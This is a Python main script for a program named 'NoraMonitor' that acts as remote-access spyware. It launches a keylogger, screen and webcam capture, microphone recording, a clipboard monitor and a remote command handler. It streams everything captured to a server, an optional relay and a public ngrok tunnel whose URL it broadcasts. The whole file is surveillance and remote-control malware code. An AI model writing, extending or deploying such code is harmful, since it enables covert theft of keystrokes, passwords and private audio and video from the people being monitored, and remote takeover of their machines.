import os
import threading

import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam
import clipboard_monitor as cb
import microphone as mic_mod

PORT = int(os.environ.get("NORA_PORT", 9090))
NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "")
NORA_RELAY = os.environ.get("NORA_RELAY", "")

_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
_TOKEN_FILE     = os.path.join(_APP_DIR, "ngrok.token")
_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")


def _load_token():
    token = NGROK_TOKEN
    if not token and os.path.exists(_TOKEN_FILE):
        with open(_TOKEN_FILE) as f:
            token = f.read().strip()
    return token


def _start_ngrok(port, broadcast_fn):
    try:
        from pyngrok import ngrok, conf
        token = _load_token()
        if not token:
            return
        conf.get_default().auth_token = token
        tunnel = ngrok.connect(port, "http")
        url = tunnel.public_url
        def _broadcast():
            import time; time.sleep(2)
            broadcast_fn(url)
        threading.Thread(target=_broadcast, daemon=True).start()
    except Exception:
        pass


def main():
    import server
    relay = None
    if NORA_RELAY:
        import relay_client
        relay = relay_client

    recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)

    def broadcast_frame(b64):
        server.broadcast_frame(b64)
        if relay: relay.broadcast_frame(b64)

    def broadcast_key(char):
        server.broadcast_key(char)
        if relay: relay.broadcast_key(char)

    def broadcast_camera(b64):
        server.broadcast_camera(b64)
        if relay: relay.broadcast_camera(b64)

    def broadcast_clipboard(text):
        server.broadcast_clipboard(text)
        if relay: relay.broadcast_clipboard(text)

    def broadcast_audio(b64):
        server.broadcast_audio(b64)
        if relay: relay.broadcast_audio(b64)

    mic = mic_mod.MicCapture(on_chunk=broadcast_audio)
    camera = cam.CameraCapture(on_frame=broadcast_camera, fps=8, quality=40)
    server.init(controller.handle_command, recorder, camera, mic)
    if relay:
        relay.init(controller.handle_command, recorder, camera, mic)
        relay.run()

    kl.Keylogger(broadcast_key).start()
    capture = sc.ScreenCapture(broadcast_frame, fps=8, quality=35, scale=0.5)
    capture.attach_recorder(recorder)
    capture.start()
    cb.ClipboardMonitor(broadcast_clipboard).start()

    threading.Thread(
        target=_start_ngrok,
        args=(PORT, server.broadcast_ngrok_url),
        daemon=True,
    ).start()

    server.run(port=PORT)


if __name__ == "__main__":
    main()
